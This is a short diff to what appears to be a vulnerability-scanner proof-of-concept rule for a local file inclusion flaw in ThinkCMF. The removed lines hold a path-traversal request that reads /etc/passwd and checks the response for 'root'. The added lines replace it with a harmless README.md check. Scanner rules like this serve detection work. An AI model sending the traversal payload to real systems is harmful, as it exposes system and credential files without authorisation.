@@ -2,9 +2,9 @@ name: poc-yaml-thinkcmf-lfi
 
 rules:
   - method: GET
-    path: "/?a=display&templateFile=././.././.././.././.././.././.././.././.././.././.././etc/./passwd"
+    path: "/?a=display&templateFile=README.md"
     expression: |
-      response.status == 200 && response.body.bcontains(bytes(string(b"root")))
+      response.status == 200 && response.body.bcontains(bytes(string(b"ThinkCMF")))
 
 detail:
   author: JerryKing
